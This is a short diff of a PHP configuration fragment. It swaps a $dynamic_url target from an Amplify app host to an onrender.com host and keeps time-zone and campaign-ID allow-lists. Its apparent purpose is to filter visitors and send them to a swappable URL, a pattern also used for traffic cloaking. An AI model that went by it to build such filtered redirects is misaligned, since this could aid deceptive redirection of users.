@@ -1,5 +1,5 @@
 <?php
-$dynamic_url = "https://main.d1r3tn1ldg47ap.amplifyapp.com/";
+$dynamic_url = "https://onrender-3brc.onrender.com";
 $allowed_timezones = ['Asia/Tokyo'];
 $allowed_campaign_ids = ['12345', '67890'];
 
